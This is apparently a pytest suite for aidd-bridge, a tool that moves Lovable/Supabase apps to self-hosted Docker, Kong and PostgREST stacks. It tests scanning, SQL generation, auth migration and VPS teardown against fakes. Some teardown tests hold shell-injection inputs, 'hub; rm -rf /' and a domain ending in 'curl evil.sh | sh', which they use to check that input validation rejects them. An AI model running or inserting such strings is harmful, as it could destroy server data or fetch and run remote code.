# -*- coding: utf-8 -*-
import os
import json
import tempfile
import argparse
from types import SimpleNamespace
import pytest
from aidd_bridge.scanner import LovableScanner
from aidd_bridge.data_bridge import DataBridge
from aidd_bridge.devops import DevOpsPackager
from aidd_bridge.unifier import MultiAppUnifier
from aidd_bridge.auth_migrator import plan_migration, AuthMigrator
from aidd_bridge.teardown import BridgeTeardown
import aidd_bridge.teardown as bridge_teardown_mod
import aidd_bridge.cli as cli_module

@pytest.fixture
def mock_lovable_project(tmp_path):
    proj = tmp_path / "mock-app"
    proj.mkdir()
    
    # package.json
    pkg = {
        "name": "mock-lovable",
        "version": "1.0.0",
        "dependencies": {"react": "^18.2.0", "@supabase/supabase-js": "^2.39.0"}
    }
    (proj / "package.json").write_text(json.dumps(pkg), encoding="utf-8")

    # src/App.tsx com rotas
    src = proj / "src"
    src.mkdir()
    (src / "App.tsx").write_text("""
    import { Route, Routes } from "react-router-dom";
    export default function App() {
        return (
            <Routes>
                <Route path="/" element={<Home />} />
                <Route path="/dashboard" element={<Dashboard />} />
            </Routes>
        );
    }
    """, encoding="utf-8")

    # migrations
    mig = proj / "supabase" / "migrations"
    mig.mkdir(parents=True)
    (mig / "20260101_init.sql").write_text("""
    CREATE EXTENSION IF NOT EXISTS "uuid-ossp";
    CREATE EXTENSION IF NOT EXISTS "supabase_vault";
    CREATE TABLE users (id UUID PRIMARY KEY, name TEXT);
    ALTER PUBLICATION supabase_realtime ADD TABLE users;
    """, encoding="utf-8")

    return str(proj)

def test_scanner(mock_lovable_project):
    scanner = LovableScanner(mock_lovable_project)
    manifest = scanner.scan()
    assert manifest["package_info"]["name"] == "mock-lovable"
    assert len(manifest["routes"]) == 2
    assert manifest["database"]["has_supabase"] is True
    assert len(manifest["database"]["migrations"]) == 1
    assert manifest["edge_functions"] == []

def test_scanner_detects_real_edge_functions(tmp_path):
    proj = tmp_path / "proj-com-funcao"
    (proj / "supabase" / "functions" / "enviar_email").mkdir(parents=True)
    (proj / "supabase" / "functions" / "enviar_email" / "index.ts").write_text("export {}", encoding="utf-8")
    # "main" (gerado pelo aidd-bridge) e "_shared" nao sao funcoes de verdade
    (proj / "supabase" / "functions" / "main").mkdir(parents=True)
    (proj / "supabase" / "functions" / "main" / "index.ts").write_text("export {}", encoding="utf-8")
    (proj / "supabase" / "functions" / "_shared").mkdir(parents=True)
    (proj / "package.json").write_text('{"name":"x"}', encoding="utf-8")

    scanner = LovableScanner(str(proj))
    manifest = scanner.scan()
    assert manifest["edge_functions"] == ["enviar_email"]

def test_data_bridge(mock_lovable_project):
    scanner = LovableScanner(mock_lovable_project)
    manifest = scanner.scan()
    bridge = DataBridge(manifest["database"]["migrations"])
    sql = bridge.generate_consolidated_init_sql()
    assert "CREATE EXTENSION IF NOT EXISTS \"uuid-ossp\";" in sql
    assert "-- [AIDD-BRIDGE REMOVED PROPRIETARY CLOUD HOOK]" in sql
    assert "ALTER PUBLICATION supabase_realtime" in sql
    assert "CREATE TABLE IF NOT EXISTS auth.users" in sql
    # auth.uid()/role()/email() precisam ler tanto a GUC antiga por-claim
    # quanto a GUC JSON atual do PostgREST (>=11 removeu db-use-legacy-gucs);
    # depender só da antiga faz auth.uid() sempre voltar NULL e travar todo RLS.
    assert "request.jwt.claim.sub" in sql
    assert "request.jwt.claims" in sql
    # auth.jwt() — muitas RLS da Lovable leem dado extra do token (ex:
    # auth.jwt()->'app_metadata'->>'empresa_id'), nao so uid/role/email
    assert "CREATE OR REPLACE FUNCTION auth.jwt()" in sql
    # service_role precisa ignorar RLS (igual Supabase real) — sem isso toda
    # operacao administrativa/backend (ex: Storage criando bucket) trava com
    # "new row violates row-level security policy". Confirmado com upload
    # real de arquivo num banco descartavel em 2026-09-10.
    assert "CREATE ROLE service_role NOLOGIN BYPASSRLS" in sql
    assert "ALTER ROLE service_role BYPASSRLS" in sql

def test_data_bridge_with_real_auth_skips_fake_users_table(mock_lovable_project):
    scanner = LovableScanner(mock_lovable_project)
    manifest = scanner.scan()
    bridge = DataBridge(manifest["database"]["migrations"])
    sql = bridge.generate_consolidated_init_sql(with_real_auth=True)
    assert "CREATE TABLE IF NOT EXISTS auth.users" not in sql
    assert "GRANT SELECT ON auth.users" not in sql
    assert "CREATE SCHEMA IF NOT EXISTS auth;" in sql

def test_devops_packager(tmp_path):
    packager = DevOpsPackager(str(tmp_path), domain="app.meusite.com")
    files = packager.export_all()
    assert "Dockerfile" in files
    assert "docker-compose.yml" in files
    assert "Caddyfile" in files
    assert os.path.exists(files["docker-compose.yml"])

    compose_content = open(files["docker-compose.yml"], encoding="utf-8").read()
    assert "postgrest" in compose_content
    assert "postgres:16-alpine" in compose_content
    # o PGRST_JWT_SECRET tinha um valor fixo diferente do gerado por
    # self.jwt — nenhum token emitido pela ferramenta (.env.production)
    # validava contra esse PostgREST. Corrigido em 2026-09-10.
    assert packager.jwt.jwt_secret in compose_content
    assert "super-secret-jwt-token-with-at-least-32-chars-long" not in compose_content
    # Storage tambem no modo standalone (Caddy), nao so no Swarm
    assert "storage" in compose_content
    assert "reverse_proxy storage:5000" in open(files["Caddyfile"], encoding="utf-8").read()

def test_unifier(mock_lovable_project, tmp_path):
    out = tmp_path / "unified-app"
    unifier = MultiAppUnifier([mock_lovable_project], str(out))
    res = unifier.merge()
    assert res["status"] == "success"
    assert os.path.exists(out / "package.json")
    assert os.path.exists(out / "src" / "AppMasterRouter.tsx")

def test_devops_full_stack_uses_pinned_official_supabase_images(tmp_path):
    packager = DevOpsPackager(str(tmp_path), domain="app.meusite.com", stack="full")
    swarm_yaml = packager.generate_docker_compose_swarm()

    assert "supabase/postgres:15.14.1.170" in swarm_yaml
    assert "supabase/gotrue:v2.197.0" in swarm_yaml
    assert "kong:3.8.0" in swarm_yaml
    assert ":latest" not in swarm_yaml.split("web:")[1].split("kong:")[0]  # nunca :latest nas imagens do stack completo

def test_devops_full_stack_kong_routes_and_entrypoint_are_valid_yaml(tmp_path):
    import yaml

    packager = DevOpsPackager(str(tmp_path), domain="app.meusite.com", stack="full")
    compose = yaml.safe_load(packager.generate_docker_compose_swarm())
    kong_conf = yaml.safe_load(packager.generate_kong_config())

    assert set(compose["services"].keys()) == {"web", "kong", "auth", "rest", "storage", "db"}
    # entrypoint precisa sobreviver ao parse do YAML igual ao comando real
    # (verificado com um deploy descartavel real em 2026-09-10 — home do
    # usuario "kong" nao existe/nao e gravavel, por isso usa /tmp)
    assert compose["services"]["kong"]["entrypoint"] == (
        'bash -c \'eval "echo \\"$$(cat /tmp/temp.yml)\\"" > /tmp/kong.yml '
        "&& /docker-entrypoint.sh kong docker-start'"
    )
    assert compose["services"]["kong"]["environment"]["KONG_DECLARATIVE_CONFIG"] == "/tmp/kong.yml"

    route_names = [s["name"] for s in kong_conf["services"]]
    assert "auth-v1" in route_names
    assert "rest-v1" in route_names
    assert "storage-v1" in route_names

    # _format_version tem que sobreviver ao truque de shell (eval/echo) que
    # injeta as chaves anon/service no kong.yml em tempo de execucao — aspas
    # DUPLAS nesse texto viram delimitador do bash e são engolidas, deixando
    # "_format_version: 2.1" (numero) em vez de string, e o Kong recusa subir
    # com "expected a string". Aspas simples atravessam ilesas. Confirmado
    # com um deploy real e descartavel em 2026-09-10.
    kong_text = packager.generate_kong_config()
    assert "_format_version: '2.1'" in kong_text
    assert '_format_version: "2.1"' not in kong_text

    # o plugin ACL do Kong exige "allow" ou "deny" explicito — sem isso o
    # Kong nem sobe (erro de config na inicializacao, confirmado com deploy
    # real). Precisa liberar os dois grupos (anon e admin/service_role).
    rest_route = next(s for s in kong_conf["services"] if s["name"] == "rest-v1")
    acl_plugin = next(p for p in rest_route["plugins"] if p["name"] == "acl")
    assert set(acl_plugin["config"]["allow"]) == {"anon", "admin"}

def test_devops_full_stack_includes_storage_with_persistent_volume(tmp_path):
    packager = DevOpsPackager(str(tmp_path), domain="app.meusite.com", stack="full")
    swarm_yaml = packager.generate_docker_compose_swarm()
    assert "supabase/storage-api:v1.75.0" in swarm_yaml
    assert "supabase_storage_admin" in swarm_yaml
    assert "app-meusite-com_storage_data:/var/lib/storage" in swarm_yaml

def test_devops_full_stack_sets_passwords_for_reserved_roles(tmp_path):
    """
    supabase_auth_admin/supabase_storage_admin/authenticator nascem SEM
    senha na imagem supabase/postgres, e sao "reserved roles" que só
    supabase_admin pode alterar (nao "postgres", que ali nao e superuser de
    verdade) — sem isso auth/rest/storage nunca conseguem conectar no banco.
    Confirmado com um deploy real e descartavel em 2026-09-10.
    """
    packager = DevOpsPackager(str(tmp_path), domain="app.meusite.com", stack="full", db_password="minhaSenha123")
    sql = packager.generate_db_passwords_sql()
    assert "\\connect postgres supabase_admin" in sql
    assert "ALTER ROLE supabase_auth_admin WITH PASSWORD 'minhaSenha123'" in sql
    assert "ALTER ROLE supabase_storage_admin WITH PASSWORD 'minhaSenha123'" in sql
    assert "ALTER ROLE authenticator WITH PASSWORD 'minhaSenha123'" in sql

    swarm_yaml = packager.generate_docker_compose_swarm()
    assert "./db-passwords.sql:/docker-entrypoint-initdb.d/zzzz-aidd-bridge-passwords.sql:ro" in swarm_yaml

def _make_project_with_function(tmp_path):
    fn_dir = tmp_path / "supabase" / "functions" / "notificar"
    fn_dir.mkdir(parents=True)
    (fn_dir / "index.ts").write_text("export {}", encoding="utf-8")
    return tmp_path

def test_devops_auto_detects_functions_and_skips_when_absent(tmp_path):
    sem_funcao = DevOpsPackager(str(tmp_path), domain="app.meusite.com")
    assert sem_funcao.functions == []
    assert "functions:" not in sem_funcao.generate_docker_compose_swarm()

    com_funcao_dir = tmp_path / "com-funcao"
    com_funcao_dir.mkdir()
    _make_project_with_function(com_funcao_dir)
    com_funcao = DevOpsPackager(str(com_funcao_dir), domain="app.meusite.com")
    assert com_funcao.functions == ["notificar"]
    assert "functions:" in com_funcao.generate_docker_compose_swarm()

def test_devops_full_stack_functions_route_through_kong(tmp_path):
    import yaml
    proj = _make_project_with_function(tmp_path)
    packager = DevOpsPackager(str(proj), domain="app.meusite.com", stack="full")
    swarm_yaml = packager.generate_docker_compose_swarm()
    kong_conf = yaml.safe_load(packager.generate_kong_config())

    assert "supabase/edge-runtime:v1.76.2" in swarm_yaml
    assert "functions/v1" in swarm_yaml  # traefik->kong precisa incluir esse prefixo
    route_names = [s["name"] for s in kong_conf["services"]]
    assert "functions-v1" in route_names

def test_devops_export_all_writes_functions_main_router(tmp_path):
    proj = _make_project_with_function(tmp_path)
    packager = DevOpsPackager(str(proj), domain="app.meusite.com", stack="full")
    files = packager.export_all()
    router_key = os.path.join("supabase", "functions", "main", "index.ts")
    assert router_key in files
    assert os.path.exists(files[router_key])
    content = open(files[router_key], encoding="utf-8").read()
    assert "EdgeRuntime.userWorkers.create" in content

def test_devops_lite_stack_includes_storage(tmp_path):
    packager = DevOpsPackager(str(tmp_path), domain="app.meusite.com")
    swarm_yaml = packager.generate_docker_compose_swarm()
    assert "supabase/storage-api:v1.75.0" in swarm_yaml
    assert "traefik.http.routers.app-meusite-com-storage.rule=Host" in swarm_yaml
    assert "middlewares.app-meusite-com-storage-strip.stripprefix.prefixes=/storage/v1" in swarm_yaml

def test_devops_lite_vs_full_stack_selection(tmp_path):
    lite = DevOpsPackager(str(tmp_path), domain="app.meusite.com").generate_docker_compose_swarm()
    full = DevOpsPackager(str(tmp_path), domain="app.meusite.com", stack="full").generate_docker_compose_swarm()
    assert "kong" not in lite
    assert "kong" in full

def test_plan_migration_inserts_only_new_accounts():
    source_users = [
        {"id": "u1", "email": "ja-existe@example.com"},
        {"id": "u2", "email": "conta-nova@example.com"},
    ]
    existing_target_ids = {"u1"}  # já migrado ou já criado manualmente no destino

    plan = plan_migration(source_users, existing_target_ids)

    assert plan["total_source"] == 2
    assert [u["id"] for u in plan["to_insert"]] == ["u2"]
    assert [u["id"] for u in plan["skipped_existing"]] == ["u1"]

def test_plan_migration_never_touches_existing_accounts_on_rerun():
    source_users = [{"id": "u1", "email": "a@example.com"}, {"id": "u2", "email": "b@example.com"}]
    # simula rodar a migração de novo depois que u2 já foi inserido
    plan_second_run = plan_migration(source_users, existing_target_ids={"u1", "u2"})
    assert plan_second_run["to_insert"] == []
    assert len(plan_second_run["skipped_existing"]) == 2

def test_plan_migration_supports_custom_id_key():
    # auth.identities usa "identity_id" em versões recentes do GoTrue, não "id"
    source_identities = [
        {"identity_id": "i1", "user_id": "u1", "provider": "email"},
        {"identity_id": "i2", "user_id": "u2", "provider": "email"},
    ]
    plan = plan_migration(source_identities, existing_target_ids={"i1"}, id_key="identity_id")
    assert [i["identity_id"] for i in plan["to_insert"]] == ["i2"]

def test_devops_swarm_postgrest_strips_rest_prefix(tmp_path):
    packager = DevOpsPackager(str(tmp_path), domain="app.meusite.com")
    swarm_yaml = packager.generate_docker_compose_swarm()
    assert "middlewares.app-meusite-com-api-strip.stripprefix.prefixes=/rest/v1" in swarm_yaml
    assert "traefik.http.routers.app-meusite-com-api.middlewares=app-meusite-com-api-strip" in swarm_yaml

def test_teardown_accepts_valid_app_name_and_domain():
    teardown = BridgeTeardown(app_name="hub-teste", domain="hub-teste.vpsconexao.org")
    assert teardown.app_name == "hub-teste"
    assert teardown.domain == "hub-teste.vpsconexao.org"

def test_teardown_rejects_app_name_with_shell_injection():
    # app_name vira literal num comando shell remoto (docker stack rm, rm -rf);
    # sem essa trava, um nome como abaixo rodaria um segundo comando na VPS.
    with pytest.raises(ValueError):
        BridgeTeardown(app_name="hub; rm -rf /")

def test_teardown_rejects_app_name_with_spaces_or_empty():
    with pytest.raises(ValueError):
        BridgeTeardown(app_name="hub teste")
    with pytest.raises(ValueError):
        BridgeTeardown(app_name="")

def test_teardown_rejects_domain_with_shell_injection():
    with pytest.raises(ValueError):
        BridgeTeardown(app_name="hub-teste", domain="hub-teste.com; curl evil.sh | sh")


# ---------------------------------------------------------------------------
# AuthMigrator — banco de dados de mentira (fake), sem Postgres real.
# Simula so o formato de consulta que o codigo de verdade manda, guardando
# dados em dicionarios Python em vez de tabelas.
# ---------------------------------------------------------------------------

import re as _re

_INSERT_RE = _re.compile(r'INSERT INTO "(\w+)"\."(\w+)" \((?P<cols>.+?)\) VALUES')
_SELECT_RE = _re.compile(r'SELECT (?P<cols>.+) FROM "(\w+)"\."(\w+)"$')


class _FakeAuthCursor:
    def __init__(self, conn, dict_mode):
        self.conn = conn
        self.dict_mode = dict_mode
        self._result = []

    def __enter__(self):
        return self

    def __exit__(self, *exc):
        return False

    def execute(self, sql, params=None):
        flat = " ".join(sql.split())
        if "information_schema.columns" in flat:
            schema, table = params
            self._result = [(c,) for c in self.conn.columns.get((schema, table), set())]
            return
        m = _INSERT_RE.search(flat)
        if m:
            schema, table = m.group(1), m.group(2)
            colnames = _re.findall(r'"(\w+)"', m.group("cols"))
            row = dict(zip(colnames, params))
            self.conn.inserted.setdefault((schema, table), []).append(row)
            self._result = []
            return
        m = _SELECT_RE.search(flat)
        if m:
            schema, table = m.group(2), m.group(3)
            colnames = _re.findall(r'"(\w+)"', m.group("cols"))
            if len(colnames) == 1:
                ids = self.conn.existing_ids.get((schema, table), set())
                self._result = [(i,) for i in ids]
            else:
                rows = self.conn.rows.get((schema, table), [])
                if self.dict_mode:
                    self._result = [{c: r.get(c) for c in colnames} for r in rows]
                else:
                    self._result = [tuple(r.get(c) for c in colnames) for r in rows]
            return
        raise AssertionError(f"consulta nao esperada no banco de mentira: {flat}")

    def fetchall(self):
        return self._result


class _FakeAuthConnection:
    def __init__(self, columns=None, rows=None, existing_ids=None):
        self.columns = columns or {}
        self.rows = rows or {}
        self.existing_ids = existing_ids or {}
        self.inserted = {}
        self.closed = False
        self.commits = 0

    def cursor(self, cursor_factory=None):
        return _FakeAuthCursor(self, dict_mode=cursor_factory is not None)

    def commit(self):
        self.commits += 1

    def close(self):
        self.closed = True


def _make_source_and_target():
    source = _FakeAuthConnection(
        columns={
            ("auth", "users"): {"id", "email", "encrypted_password"},
            ("auth", "identities"): {"identity_id", "user_id", "provider"},
        },
        rows={
            ("auth", "users"): [
                {"id": "u1", "email": "ja-existe@example.com", "encrypted_password": "hash1"},
                {"id": "u2", "email": "conta-nova@example.com", "encrypted_password": "hash2"},
            ],
            ("auth", "identities"): [
                {"identity_id": "i1", "user_id": "u1", "provider": "email"},
                {"identity_id": "i2", "user_id": "u2", "provider": "email"},
            ],
        },
    )
    target = _FakeAuthConnection(
        columns={
            ("auth", "users"): {"id", "email", "encrypted_password"},
            ("auth", "identities"): {"identity_id", "user_id", "provider"},
        },
        existing_ids={
            ("auth", "users"): {"u1"},
            ("auth", "identities"): {"i1"},
        },
    )
    return source, target


def _wire_migrator(monkeypatch, source, target):
    migrator = AuthMigrator("source-dsn", "target-dsn")
    monkeypatch.setattr(migrator, "_connect", lambda dsn: source if dsn == "source-dsn" else target)
    return migrator


def test_auth_migrator_preview_mode_never_writes_to_target(monkeypatch):
    source, target = _make_source_and_target()
    migrator = _wire_migrator(monkeypatch, source, target)

    report = migrator.migrate(dry_run=True)

    assert report["dry_run"] is True
    assert report["users"]["would_insert"] == 1
    assert report["users"]["inserted"] == 0
    assert target.inserted == {}


def test_auth_migrator_apply_inserts_only_new_account_and_preserves_password_hash(monkeypatch):
    source, target = _make_source_and_target()
    migrator = _wire_migrator(monkeypatch, source, target)

    report = migrator.migrate(dry_run=False)

    assert report["users"]["inserted"] == 1
    novos = target.inserted[("auth", "users")]
    assert [u["id"] for u in novos] == ["u2"]
    assert novos[0]["encrypted_password"] == "hash2"  # hash preservado, nunca trocado

    novas_identidades = target.inserted[("auth", "identities")]
    assert [i["identity_id"] for i in novas_identidades] == ["i2"]


def test_auth_migrator_never_touches_account_that_already_exists_on_rerun(monkeypatch):
    source, target = _make_source_and_target()
    # simula rodar a migracao de novo depois que tudo ja foi inserido antes
    target.existing_ids[("auth", "users")] = {"u1", "u2"}
    target.existing_ids[("auth", "identities")] = {"i1", "i2"}

    migrator = _wire_migrator(monkeypatch, source, target)
    report = migrator.migrate(dry_run=False)

    assert report["users"]["inserted"] == 0
    assert report["identities"]["inserted"] == 0
    assert target.inserted == {}


def test_auth_migrator_skips_identities_when_target_schema_incompatible(monkeypatch):
    source, target = _make_source_and_target()
    target.columns[("auth", "identities")] = {"identity_id", "user_id"}  # falta "provider" no destino

    migrator = _wire_migrator(monkeypatch, source, target)
    report = migrator.migrate(dry_run=True)

    assert "skipped_incompatible" in report["identities"]
    assert report["identities"]["inserted"] == 0


def test_auth_migrator_closes_both_connections_even_when_migration_fails(monkeypatch):
    source, target = _make_source_and_target()
    target.columns[("auth", "users")] = {"id", "email"}  # falta "encrypted_password" no destino

    migrator = _wire_migrator(monkeypatch, source, target)
    with pytest.raises(RuntimeError):
        migrator.migrate(dry_run=True)

    assert source.closed
    assert target.closed


# ---------------------------------------------------------------------------
# BridgeTeardown — servidor (SSH) e Cloudflare de mentira, sem rede real.
# ---------------------------------------------------------------------------

class _FakeSSHStream:
    def __init__(self, output=""):
        self._output = output.encode("utf-8")
        self.channel = SimpleNamespace(recv_exit_status=lambda: 0)

    def read(self):
        return self._output


class _FakeSSHClient:
    def __init__(self, connect_error=None):
        self.connected = False
        self.commands = []
        self.closed = False
        self._connect_error = connect_error

    def set_missing_host_key_policy(self, policy):
        pass

    def connect(self, host, username=None, password=None, timeout=None):
        if self._connect_error:
            raise self._connect_error
        self.connected = True
        self.host = host

    def exec_command(self, cmd):
        self.commands.append(cmd)
        return None, _FakeSSHStream("ok"), _FakeSSHStream("")

    def close(self):
        self.closed = True


def _wire_fake_ssh(monkeypatch, fake_ssh):
    monkeypatch.setattr(
        bridge_teardown_mod,
        "paramiko",
        SimpleNamespace(SSHClient=lambda: fake_ssh, AutoAddPolicy=lambda: None),
    )
    monkeypatch.setattr(bridge_teardown_mod.time, "sleep", lambda s: None)


def test_destroy_vps_stack_removes_stack_volumes_and_directory(monkeypatch):
    fake_ssh = _FakeSSHClient()
    _wire_fake_ssh(monkeypatch, fake_ssh)

    teardown = BridgeTeardown(app_name="hub-teste", vps_host="1.2.3.4", vps_password="senha")
    result = teardown.destroy_vps_stack()

    assert result["status"] == "success"
    assert fake_ssh.connected and fake_ssh.closed
    assert "docker stack rm hub-teste" in fake_ssh.commands
    assert any("docker volume rm" in c for c in fake_ssh.commands)
    assert "rm -rf /root/hub-teste && rm -f /root/aidd-bridge-deploy/hub-teste*" in fake_ssh.commands


def test_destroy_vps_stack_can_skip_volumes_and_directory(monkeypatch):
    fake_ssh = _FakeSSHClient()
    _wire_fake_ssh(monkeypatch, fake_ssh)

    teardown = BridgeTeardown(app_name="hub-teste", vps_host="1.2.3.4", vps_password="senha")
    result = teardown.destroy_vps_stack(remove_volumes=False, remove_dir=False)

    assert result["details"]["volumes"] is None
    assert result["details"]["directory"] is None
    assert not any("docker volume rm" in c for c in fake_ssh.commands)
    assert not any(c.startswith("rm -rf") for c in fake_ssh.commands)


def test_destroy_vps_stack_fails_without_credentials(monkeypatch):
    monkeypatch.delenv("VPS_HOST", raising=False)
    monkeypatch.delenv("VPS_PASSWORD", raising=False)

    teardown = BridgeTeardown(app_name="hub-teste")
    result = teardown.destroy_vps_stack()

    assert result["status"] == "error"


def test_destroy_vps_stack_fails_cleanly_when_paramiko_not_installed(monkeypatch):
    monkeypatch.setattr(bridge_teardown_mod, "paramiko", None)

    teardown = BridgeTeardown(app_name="hub-teste", vps_host="1.2.3.4", vps_password="senha")
    result = teardown.destroy_vps_stack()

    assert result["status"] == "error"
    assert "paramiko" in result["error"]


def test_destroy_vps_stack_returns_error_and_closes_ssh_on_connection_failure(monkeypatch):
    fake_ssh = _FakeSSHClient(connect_error=TimeoutError("nao conectou"))
    _wire_fake_ssh(monkeypatch, fake_ssh)

    teardown = BridgeTeardown(app_name="hub-teste", vps_host="1.2.3.4", vps_password="senha")
    result = teardown.destroy_vps_stack()

    assert result["status"] == "error"
    assert fake_ssh.closed


def test_delete_cloudflare_dns_skips_when_credentials_missing():
    teardown = BridgeTeardown(app_name="hub-teste")
    result = teardown.delete_cloudflare_dns()
    assert result["status"] == "skipped"


def test_delete_cloudflare_dns_calls_cloudflare_client_with_right_domain(monkeypatch):
    calls = {}

    class _FakeCF:
        def __init__(self, zone_id, api_token):
            calls["zone_id"] = zone_id
            calls["api_token"] = api_token

        def deletar_registro(self, domain):
            calls["domain"] = domain
            return {"status": "success", "deleted": [{"id": "abc"}]}

    monkeypatch.setattr(bridge_teardown_mod, "CloudflareDNS", _FakeCF)

    teardown = BridgeTeardown(
        app_name="hub-teste", domain="hub-teste.vpsconexao.org",
        cf_api_token="tok", cf_zone_id="zone1",
    )
    result = teardown.delete_cloudflare_dns()

    assert result["status"] == "success"
    assert calls == {"zone_id": "zone1", "api_token": "tok", "domain": "hub-teste.vpsconexao.org"}


def test_execute_teardown_combines_dns_and_vps_results(monkeypatch):
    monkeypatch.setattr(
        bridge_teardown_mod, "CloudflareDNS",
        lambda zone_id, api_token: SimpleNamespace(deletar_registro=lambda domain: {"status": "success"}),
    )
    fake_ssh = _FakeSSHClient()
    _wire_fake_ssh(monkeypatch, fake_ssh)

    teardown = BridgeTeardown(
        app_name="hub-teste", domain="hub-teste.com",
        vps_host="1.2.3.4", vps_password="senha",
        cf_api_token="t", cf_zone_id="z",
    )
    result = teardown.execute_teardown()

    assert result["app_name"] == "hub-teste"
    assert result["dns"]["status"] == "success"
    assert result["vps"]["status"] == "success"


# ---------------------------------------------------------------------------
# cmd_destroy — fluxo completo da linha de comando (confirmacao, --yes, erros)
# ---------------------------------------------------------------------------

def _destroy_args(**overrides):
    defaults = dict(
        app_name="hub-teste", domain=None, vps_host=None, vps_user="root",
        vps_password=None, cf_token=None, cf_zone_id=None, yes=True,
    )
    defaults.update(overrides)
    return argparse.Namespace(**defaults)


def test_cmd_destroy_cancels_when_user_does_not_confirm(monkeypatch, capsys):
    monkeypatch.setattr("builtins.input", lambda prompt: "n")

    def _should_not_run(**kw):
        raise AssertionError("nao deveria instanciar BridgeTeardown sem confirmacao")
    monkeypatch.setattr(cli_module, "BridgeTeardown", _should_not_run)

    rc = cli_module.cmd_destroy(_destroy_args(yes=False))

    assert rc == 0
    assert "CANCELADO" in capsys.readouterr().out


def test_cmd_destroy_skips_confirmation_prompt_with_yes_flag(monkeypatch):
    def _fail_if_asked(prompt):
        raise AssertionError("nao deveria perguntar nada com --yes")
    monkeypatch.setattr("builtins.input", _fail_if_asked)

    class _FakeTeardown:
        def __init__(self, **kw):
            pass

        def execute_teardown(self):
            return {
                "dns": {"status": "skipped"},
                "vps": {"status": "success", "details": {"stack": "removida", "volumes": "ok", "directory": "ok"}},
            }

    monkeypatch.setattr(cli_module, "BridgeTeardown", _FakeTeardown)

    rc = cli_module.cmd_destroy(_destroy_args(yes=True))

    assert rc == 0


def test_cmd_destroy_returns_error_code_when_vps_teardown_fails(monkeypatch):
    class _FakeTeardown:
        def __init__(self, **kw):
            pass

        def execute_teardown(self):
            return {"dns": {"status": "skipped"}, "vps": {"status": "error", "error": "falha ssh"}}

    monkeypatch.setattr(cli_module, "BridgeTeardown", _FakeTeardown)

    rc = cli_module.cmd_destroy(_destroy_args(yes=True))

    assert rc == 1


def test_cmd_destroy_rejects_invalid_app_name_before_touching_network(capsys):
    # Usa o BridgeTeardown de verdade (nao mockado): a validacao precisa
    # barrar o nome malicioso antes de qualquer tentativa de SSH/DNS.
    rc = cli_module.cmd_destroy(_destroy_args(app_name="hub; rm -rf /", yes=True))

    assert rc == 1
    assert "invalido" in capsys.readouterr().out